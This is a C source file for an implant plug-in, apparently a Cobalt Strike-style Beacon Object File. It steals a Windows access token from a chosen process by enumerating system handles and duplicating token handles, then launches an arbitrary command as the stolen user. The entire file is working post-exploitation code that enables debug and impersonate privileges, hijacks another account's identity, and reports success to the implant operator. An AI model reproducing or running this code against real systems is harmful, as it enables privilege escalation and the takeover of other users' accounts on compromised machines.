/*
 * impersonate_bof.c
 *
 * BOF version of impersonate.c -- steals a token from a target PID via
 * handle enumeration (NtQuerySystemInformation + DuplicateHandle) and
 * launches a specified command as the stolen identity.
 *
 * Arguments (packed via bof_pack):
 *   int     target_pid  - PID to steal token from
 *   z-string command    - command line to spawn (e.g. "cmd.exe", "whoami.exe")
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c -o impersonate_bof.x64.o impersonate_bof.c
 */

#include <windows.h>
#include "beacon.h"

/* ── ntdll types ───────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004)
#define SystemHandleInformation 16

typedef struct {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG                NumberOfHandles;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION;

/* ── DFR declarations ──────────────────────────────────────────────── */

/* kernel32 */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);

/* advapi32 */
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$EqualSid(PSID, PSID);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CopySid(DWORD, PSID, PSID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

/* msvcrt */
DECLSPEC_IMPORT void  *MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void  *MSVCRT$realloc(void*, size_t);
DECLSPEC_IMPORT void   MSVCRT$free(void*);
DECLSPEC_IMPORT void  *MSVCRT$memset(void*, int, size_t);

/* ntdll - resolved at runtime */
typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);

/* ── helpers ───────────────────────────────────────────────────────── */

static void enable_priv(const char *priv_name) {
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

static BOOL is_token_handle(HANDLE h) {
    TOKEN_TYPE tt;
    DWORD len;
    return ADVAPI32$GetTokenInformation(h, TokenType, &tt, sizeof(tt), &len);
}

static PSID get_token_user_sid(HANDLE tok) {
    DWORD len = 0;
    ADVAPI32$GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    if (!len) return NULL;
    TOKEN_USER *tu = MSVCRT$malloc(len);
    if (!tu) return NULL;
    PSID copy = NULL;
    if (ADVAPI32$GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        DWORD slen = ADVAPI32$GetLengthSid(tu->User.Sid);
        copy = MSVCRT$malloc(slen);
        if (copy) ADVAPI32$CopySid(slen, copy, tu->User.Sid);
    }
    MSVCRT$free(tu);
    return copy;
}

/* ── BOF entry point ───────────────────────────────────────────────── */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int target_pid = BeaconDataInt(&parser);
    int cmd_len    = 0;
    char *cmd      = BeaconDataExtract(&parser, &cmd_len);

    if (target_pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: impersonate_bof <PID> <command>");
        return;
    }
    if (!cmd || !cmd[0]) {
        BeaconPrintf(CALLBACK_ERROR, "No command specified");
        return;
    }

    /* Resolve NtQuerySystemInformation */
    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) { BeaconPrintf(CALLBACK_ERROR, "No ntdll"); return; }
    NtQuerySystemInformation_t pNtQSI = (NtQuerySystemInformation_t)
        KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQSI) { BeaconPrintf(CALLBACK_ERROR, "No NtQuerySystemInformation"); return; }

    enable_priv("SeDebugPrivilege");
    enable_priv("SeImpersonatePrivilege");

    /* Open target process */
    HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)target_pid);
    if (!proc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) FAILED: %lu",
                     target_pid, KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened PID %d", target_pid);

    /* Enumerate system handles */
    ULONG bufsize = 1024 * 1024;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS status;
    do {
        shi = MSVCRT$realloc(shi, bufsize);
        if (!shi) {
            BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
            KERNEL32$CloseHandle(proc);
            return;
        }
        status = pNtQSI(SystemHandleInformation, shi, bufsize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH)
            bufsize *= 2;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation FAILED: 0x%08lx", status);
        MSVCRT$free(shi);
        KERNEL32$CloseHandle(proc);
        return;
    }

    /* Get our own SID to skip matching tokens */
    PSID our_sid = NULL;
    {
        HANDLE our_tok;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &our_tok)) {
            our_sid = get_token_user_sid(our_tok);
            KERNEL32$CloseHandle(our_tok);
        }
    }

    /* Find a token handle belonging to a different user */
    HANDLE stolen = NULL;
    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
        if (e->ProcessId != (ULONG)target_pid)
            continue;

        HANDLE dup = NULL;
        if (!KERNEL32$DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
                KERNEL32$GetCurrentProcess(), &dup,
                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                FALSE, 0))
            continue;

        if (!is_token_handle(dup)) {
            KERNEL32$CloseHandle(dup);
            continue;
        }

        PSID tok_sid = get_token_user_sid(dup);
        if (tok_sid && our_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
            MSVCRT$free(tok_sid);
            KERNEL32$CloseHandle(dup);
            continue;
        }

        if (tok_sid) {
            char name[256] = {0}, domain[256] = {0};
            DWORD nlen = sizeof(name), dlen = sizeof(domain);
            SID_NAME_USE use;
            ADVAPI32$LookupAccountSidA(NULL, tok_sid, name, &nlen, domain, &dlen, &use);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Stolen token: %s\\%s (handle 0x%x)",
                         domain, name, e->Handle);
            MSVCRT$free(tok_sid);
        }
        stolen = dup;
        break;
    }

    MSVCRT$free(shi);
    MSVCRT$free(our_sid);

    if (!stolen) {
        BeaconPrintf(CALLBACK_ERROR, "No usable token found in PID %d", target_pid);
        KERNEL32$CloseHandle(proc);
        return;
    }

    /* Duplicate as primary token for CreateProcessWithTokenW */
    HANDLE primary = NULL;
    if (!ADVAPI32$DuplicateTokenEx(stolen, MAXIMUM_ALLOWED, NULL,
            SecurityImpersonation, TokenPrimary, &primary)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx FAILED: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(stolen);
        KERNEL32$CloseHandle(proc);
        return;
    }

    /* Convert command to wide string */
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
    WCHAR *wcmd = MSVCRT$malloc(wlen * sizeof(WCHAR));
    if (!wcmd) {
        BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
        KERNEL32$CloseHandle(primary);
        KERNEL32$CloseHandle(stolen);
        KERNEL32$CloseHandle(proc);
        return;
    }
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

    /* Launch process under stolen identity */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!ADVAPI32$CreateProcessWithTokenW(primary, 0, NULL, wcmd,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW FAILED: %lu",
                     KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Launched '%s' as PID %lu", cmd, pi.dwProcessId);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    }

    MSVCRT$free(wcmd);
    KERNEL32$CloseHandle(primary);
    KERNEL32$CloseHandle(stolen);
    KERNEL32$CloseHandle(proc);
}
